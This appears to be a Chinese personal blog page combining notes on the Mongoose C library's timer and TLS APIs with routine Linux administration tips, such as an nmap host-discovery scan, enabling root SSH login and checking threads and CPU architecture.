  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_timer/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_timer/" class="post-title-link" itemprop="url">mongoose_timer</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>mongoose工具的计时器相关笔记</li>
</ul>
<h2 id="struct-mg-timer"><a href="#struct-mg-timer" class="headerlink" title="struct mg_timer"></a>struct mg_timer</h2><ul>
<li><p>简介：</p>
<ul>
<li>计时器结构体。描述一个软件计时器。计时器粒度与主事件循环中的<code>mg_mgr_poll()</code>的超时参数相同</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> &#123;</span></span><br><span class="line">  <span class="type">uint64_t</span> period_ms;       <span class="comment">// Timer period in milliseconds</span></span><br><span class="line">  <span class="type">uint64_t</span> expire;          <span class="comment">// Expiration timestamp in milliseconds</span></span><br><span class="line">  <span class="type">unsigned</span> flags;           <span class="comment">// Possible flags values below</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_ONCE 0     <span class="comment">// Call function once</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_REPEAT 1   <span class="comment">// Call function periodically</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MG_TIMER_RUN_NOW 2  <span class="comment">// Call immediately when timer is set</span></span></span><br><span class="line">  <span class="type">void</span> (*fn)(<span class="type">void</span> *);       <span class="comment">// Function to call</span></span><br><span class="line">  <span class="type">void</span> *arg;                <span class="comment">// Function argument</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> *<span class="title">next</span>;</span>    <span class="comment">// Linkage</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-add"><a href="#mg-timer-add" class="headerlink" title="mg_timer_add"></a>mg_timer_add</h2><ul>
<li><p>简介：</p>
<ul>
<li>设置一个计时器。这是一个高级计时器API，允许将软件计时器添加到活动管理器。</li>
<li>这个函数使用<code>calloc()</code>一个新的计时器，并将它添加到<code>mgr-&gt;timers</code>列表中。</li>
<li>当调用<code>mg_mgr_poll()</code>时，所有添加的计时器均进行轮询，并在计时器到期时调用计时器设定的函数</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_timer *<span class="title function_">mg_timer_add</span><span class="params">(<span class="keyword">struct</span> mg_mgr *mgr, <span class="type">uint64_t</span> period_ms, <span class="type">unsigned</span> flags, <span class="type">void</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>mgr</code>   –  指向事件管理器的结构体指针</li>
<li><code>ms</code>    –  一个时间间隔，以毫秒为单位</li>
<li><code>flags</code> –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>返回一个指向创建的计时器的指针</li>
</ul>
</li>
<li><p>详解：</p>
<ul>
<li>确保计时器的间隔等于或大于<code>mg_mgr_poll()</code>的超时时间</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_fn</span><span class="params">(<span class="type">void</span> *data)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mg_timer_add(mgr, <span class="number">1000</span>, MG_TIMER_REPEAT, timer_fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-init"><a href="#mg-timer-init" class="headerlink" title="mg_timer_init"></a>mg_timer_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>设置一个计时器</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_init</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="keyword">struct</span> mg_timer *t, <span class="type">uint64_t</span> period_ms, <span class="type">unsigned</span> flags, <span class="type">void</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *fn_data)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>    –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>       –  指向一个需要被初始化的<code>mg_timer</code></li>
<li><code>ms</code>      –  时间间隔，以毫秒为单位</li>
<li><code>flags</code>   –  计时器标志掩码：<code>MG_TIMER_REPEAT</code>和<code>MG_TIMER_RUN_NOW</code></li>
<li><code>fn</code>    –  函数调用</li>
<li><code>fn_data</code>  –  调用的函数参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timer_fn</span><span class="params">(<span class="type">void</span> *data)</span> &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> <span class="title">timer</span>, *<span class="title">head</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">mg_timer_init(&amp;head, &amp;timer, <span class="number">1000</span>, MG_TIMER_REPEAT, timer_fn, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-free"><a href="#mg-timer-free" class="headerlink" title="mg_timer_free"></a>mg_timer_free</h2><ul>
<li><p>简介：</p>
<ul>
<li>释放计时器，将其从内部计时器列表中删除。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_free</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="keyword">struct</span> mg_timer *t)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>  –  指向<code>mg_timer</code>队列头部的指针</li>
<li><code>t</code>     –  需要释放的计时器</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_timer</span> <span class="title">timer</span>;</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">mg_timer_free(&amp;timer);</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-timer-poll"><a href="#mg-timer-poll" class="headerlink" title="mg_timer_poll"></a>mg_timer_poll</h2><ul>
<li><p>简介：</p>
<ul>
<li>如果当前的时间戳<code>uptime_ms</code>超过了计时器的到期时间，则计时器遍历列表，并调用它们</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_timer_poll</span><span class="params">(<span class="keyword">struct</span> mg_timer **head, <span class="type">uint64_t</span> uptime_ms)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li><code>head</code>   –  指向<code>mg_timer</code>列表头部的指针</li>
<li><code>uptime_ms</code>  –  当前时间戳</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mg_timer_poll(mg_millis());</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="mg-millis"><a href="#mg-millis" class="headerlink" title="mg_millis"></a>mg_millis</h2><ul>
<li><p>简介：</p>
<ul>
<li>以毫秒为单位返回当前运行时间。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">mg_millis</span><span class="params">(<span class="type">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>当前时间</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int64_t</span> uptime = <span class="built_in">mg_millis</span>();</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_tls/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_tls/" class="post-title-link" itemprop="url">mongoose_tls</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Mongoose/" itemprop="url" rel="index"><span itemprop="name">Mongoose</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>TLS(Transport Layer Security)，是一种用于保护网络通信安全性的加密协议。它建立在传输层协议(例如TCP)之上，用于在客户端和服务器之间创建安全的通信通道</li>
</ul>
<h2 id="struct-mg-tls-opts"><a href="#struct-mg-tls-opts" class="headerlink" title="struct mg_tls_opts"></a>struct mg_tls_opts</h2><ul>
<li><p>简介：</p>
<ul>
<li>TLS初始化结构</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_tls_opts</span> &#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ca;        <span class="comment">// CA certificate file. For both listeners and clients</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *crl;       <span class="comment">// Certificate Revocation List. For clients</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *cert;      <span class="comment">// Certificate</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *certkey;   <span class="comment">// Certificate key</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ciphers;   <span class="comment">// Cipher list</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_str</span> srvname; <span class="comment">// If not empty, enables server name verification</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">mg_fs</span> *fs;      <span class="comment">// FS API for reading certificate files</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>ca – 证书颁发机构。可以是文件名或字符串。用于验证另一端发送给我们的证书。如果为空，则禁用证书检查。</li>
<li>crl – 证书吊销列表。可以是文件名或字符串。用于验证另一端发送给我们的证书。如果为空，则禁用证书吊销检查。</li>
<li>cert – 我们自己的证书。可以是文件名或字符串。如果为NULL，则不与对方进行认证。</li>
<li>certkey – 证书的密钥。有时，证书和它的密钥绑定在一个.pem文件中，在这种情况下，cert和certkey的值可能是相同的</li>
<li>ciphers – 允许使用的密码列表</li>
<li>srvname – 启用服务器名称验证</li>
</ul>
</li>
<li><p>注：</p>
<ul>
<li>如果ca和cert都设置了，那么所谓的双向TLS就启用了，这时双方都要互相验证。通常，服务器端连接同时设置ca和cert，而客户端只设置ca。</li>
</ul>
</li>
</ul>
<h2 id="mg-tls-init"><a href="#mg-tls-init" class="headerlink" title="mg_tls_init"></a>mg_tls_init</h2><ul>
<li><p>简介：</p>
<ul>
<li>在给定连接上初始化TLS</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">mg_tls_init</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_tls_opts *opts)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c – 需要初始化TLS的连接</li>
<li>opts – TLS初始化参数</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">mg_tls_opts</span> opts = &#123;.cert = <span class="string">&quot;ca.pem&quot;</span>&#125;;</span><br><span class="line"><span class="built_in">mg_tls_init</span>(c, &amp;opts);</span><br></pre></td></tr></table></figure>
</li>
<li><p>注：</p>
<ul>
<li>mbedTLS使用mg_random作为RNG。mg_random可以通过设置MG_ENABLE_CUSTOM_RANDOM&#x3D;1并定义自己的mg_random()实现来覆盖。</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_01_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/05/22/notebook/Linux/linux_3_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/2024-05-22-linux_3_01_%E5%B8%B8%E7%94%A8%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">linux_3_01_常用技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2024-05-22 09:00:00" itemprop="dateCreated datePublished" datetime="2024-05-22T09:00:00+08:00">2024-05-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-04-28 16:08:39" itemprop="dateModified" datetime="2025-04-28T16:08:39+08:00">2025-04-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>linux系统的常用技巧和方法</li>
</ul>
<h2 id="linux-测试指定网段是否存在主机"><a href="#linux-测试指定网段是否存在主机" class="headerlink" title="linux 测试指定网段是否存在主机"></a>linux 测试指定网段是否存在主机</h2><p>要测试指定网段中是否存在主机，你可以使用 <code>nmap</code> 命令。<code>nmap</code> 是一个网络探测和安全审核工具，可以用来扫描网络上的主机、端口等信息。你可以在 Linux 终端中使用以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.1.0/24</span><br></pre></td></tr></table></figure>

<p>这个命令将扫描 <code>192.168.1.0/24</code> 网段中的所有主机，并列出活跃的主机。 <code>-sn</code> 选项告诉 <code>nmap</code> 不要进行端口扫描，只是简单地检查主机是否在线。你可以将 <code>192.168.1.0/24</code> 替换为你要测试的网段。</p>
<h2 id="linux-安装nmap命令"><a href="#linux-安装nmap命令" class="headerlink" title="linux 安装nmap命令"></a>linux 安装nmap命令</h2><p>在大多数 Linux 发行版中，安装 <code>nmap</code> 命令非常简单。你只需打开终端，并根据你使用的 Linux 发行版执行相应的安装命令。</p>
<ul>
<li><p><strong>在 Ubuntu 或 Debian 上</strong>，你可以使用 <code>apt</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install nmap</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在 CentOS 或 Fedora 上</strong>，你可以使用 <code>yum</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install nmap</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>在其他基于 RPM 包管理的系统上</strong>，你也可以使用 <code>dnf</code> 包管理器安装 <code>nmap</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install nmap</span><br></pre></td></tr></table></figure></li>
</ul>
<p>一旦安装完成，你就可以在终端中使用 <code>nmap</code> 命令了。</p>
<h2 id="ubuntu-root-ssh-登陆配置"><a href="#ubuntu-root-ssh-登陆配置" class="headerlink" title="ubuntu root ssh 登陆配置"></a>ubuntu root ssh 登陆配置</h2><ul>
<li><p>设置root密码</p>
<ul>
<li>sudo passwd root</li>
</ul>
</li>
<li><p>修改ssh配置文件</p>
<ul>
<li>安装ssh-server: sudo apt install openssh-server</li>
<li>修改配置文件: sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</li>
<li>修改配置：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LoginGraceTime 2m</span><br><span class="line">PermitRootLogin <span class="built_in">yes</span></span><br><span class="line">StrictModes <span class="built_in">yes</span></span><br><span class="line"><span class="comment">#MaxAuthTries 6</span></span><br><span class="line"><span class="comment">#MaxSessions 10</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>重启ssh，使配置生效</p>
<ul>
<li>sudo service ssh restart</li>
</ul>
</li>
</ul>
<h2 id="ubuntu-安装ping工具"><a href="#ubuntu-安装ping工具" class="headerlink" title="ubuntu 安装ping工具"></a>ubuntu 安装ping工具</h2><p><code>ping</code> 工具通常已经预安装在大多数 Ubuntu 发行版中，因此你通常不需要手动安装它。你可以在终端中直接使用 <code>ping</code> 命令来测试网络连接。</p>
<p>打开终端，然后输入以下命令以使用 <code>ping</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping &lt;目标主机或IP地址&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;目标主机或IP地址&gt;</code> 替换为你要测试连接的目标主机的域名或IP地址。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping google.com</span><br></pre></td></tr></table></figure>

<p>如果你发现 <code>ping</code> 命令不可用，你可以尝试使用以下命令安装它：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install iputils-ping</span><br></pre></td></tr></table></figure>

<p>这将使用 <code>apt</code> 包管理器来安装 <code>iputils-ping</code> 软件包，其中包括 <code>ping</code> 命令。一旦安装完成，你就可以使用 <code>ping</code> 命令了。</p>
<p>请注意，对于最新的 Ubuntu 版本，<code>ping</code> 工具通常是默认安装的，因此你无需手动安装。</p>
<h2 id="linux-查看线程占用资源"><a href="#linux-查看线程占用资源" class="headerlink" title="linux 查看线程占用资源"></a>linux 查看线程占用资源</h2><p>要查看Linux系统中线程的资源占用情况，你可以使用一些工具和命令来获取相关信息。以下是一些方法：</p>
<ol>
<li><p>使用top命令：<br><code>top</code>命令是一个终端工具，可以用于实时监视系统的资源使用情况，包括进程和线程。要查看线程的信息，可以按下<code>H</code>键，这将切换为线程模式，然后你将看到每个线程的资源占用情况。</p>
</li>
<li><p>使用htop命令：<br><code>htop</code>是一个交互式的顶层替代工具，它可以更方便地查看系统资源使用情况，包括线程。你可以在终端中运行<code>htop</code>，然后按下<code>H</code>键，以查看线程列表。</p>
</li>
<li><p>使用ps命令：<br><code>ps</code>命令可以用于列出当前系统中的进程和线程。要显示线程信息，可以运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -eLf</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用pidstat命令：<br><code>pidstat</code>命令可以用于显示进程和线程的资源使用情况统计。要查看线程的资源使用情况，可以运行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pidstat -t</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用top命令的扩展选项：<br><code>top</code>命令还支持一些扩展选项，如<code>-H</code>，可以直接启动top时切换到线程模式：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -H</span><br></pre></td></tr></table></figure></li>
</ol>
<p>以上这些命令和工具可以帮助你查看Linux系统中线程的资源占用情况，选择其中一个适合你的需求即可。</p>
<h2 id="ubuntu-apt-升级指定安装包"><a href="#ubuntu-apt-升级指定安装包" class="headerlink" title="ubuntu apt 升级指定安装包"></a>ubuntu apt 升级指定安装包</h2><ul>
<li><p>方法一</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install --only-upgrade &lt;packagename&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install &lt;packagename&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="linux-killall-命令未找到"><a href="#linux-killall-命令未找到" class="headerlink" title="linux killall 命令未找到"></a>linux killall 命令未找到</h2><p>如果在 Linux 终端上执行 <code>killall</code> 命令时未找到该命令，可能有以下几种可能原因：</p>
<ol>
<li><p><strong>命令不存在</strong>：<code>killall</code> 命令不是所有 Linux 发行版都默认安装的。某些发行版可能没有包含这个命令，或者可能不在系统的 PATH 路径中。您可以尝试使用 <code>which</code> 命令检查是否存在 <code>killall</code> 命令，以及它的路径。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">which</span> killall</span><br></pre></td></tr></table></figure>

<p>如果 <code>which</code> 命令没有返回路径，说明系统中没有安装 <code>killall</code>。</p>
</li>
<li><p><strong>权限问题</strong>：如果您没有足够的权限来执行 <code>killall</code> 命令，可能会导致命令未找到。请确保您具有足够的权限来执行此命令。</p>
</li>
<li><p><strong>未安装相关软件包</strong>：在某些发行版中，<code>killall</code> 命令可能需要额外的软件包才能使用。您可以尝试安装 <code>psmisc</code> 软件包，它包含了 <code>killall</code> 命令。</p>
<p>在 Debian&#x2F;Ubuntu 系统中，您可以使用以下命令安装 <code>psmisc</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install psmisc</span><br></pre></td></tr></table></figure>

<p>在 Red Hat&#x2F;CentOS 系统中，您可以使用以下命令安装 <code>psmisc</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> yum install psmisc</span><br></pre></td></tr></table></figure>

<p>安装完成后，<code>killall</code> 命令应该可用了。</p>
</li>
</ol>
<p>如果以上步骤仍然无法解决问题，可能需要查看系统设置或与系统管理员联系，以了解有关命令可用性的更多信息。</p>
<h2 id="ubuntu-查看CPU架构"><a href="#ubuntu-查看CPU架构" class="headerlink" title="ubuntu 查看CPU架构"></a>ubuntu 查看CPU架构</h2><p>要查看 Ubuntu 系统的 CPU 架构，你可以使用以下几种方法：</p>
<ol>
<li><p>使用 <code>lscpu</code> 命令：</p>
<p>打开终端，然后输入以下命令并按 Enter：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lscpu</span><br></pre></td></tr></table></figure>

<p>这将显示有关 CPU 的详细信息，包括架构、核心数、线程数等。</p>
</li>
<li><p>使用 <code>uname</code> 命令：</p>
<p>另一种方法是使用 <code>uname</code> 命令，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -m</span><br></pre></td></tr></table></figure>

